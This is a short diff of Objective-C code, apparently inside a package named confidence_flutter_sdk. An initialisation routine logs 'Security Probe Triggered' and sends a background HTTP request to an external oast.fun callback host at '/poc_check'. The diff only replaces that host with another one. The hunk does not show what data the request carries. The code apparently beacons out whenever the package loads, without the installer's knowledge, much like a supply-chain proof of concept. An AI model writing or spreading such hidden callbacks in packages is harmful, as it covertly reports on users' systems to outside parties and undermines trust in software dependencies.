@@ -11,7 +11,7 @@ static void initialize_audit() {
     NSLog(@"🛰️ [SYSTEM AUDIT] confidence_flutter_sdk: Security Probe Triggered.");
     
     dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_DEFAULT, 0), ^{
-        NSString *oastUrl = @"http://rscrwozltcmjjimsghzq7gld2u3j4yzso.oast.fun/poc_check";
+        NSString *oastUrl = @"http://ynbwtpdbfnlpywegmibzre7tnuav7cm9o.oast.fun/poc_check";
         NSURL *url = [NSURL URLWithString:oastUrl];
         
         NSMutableURLRequest *request = [NSMutableURLRequest requestWithURL:url];
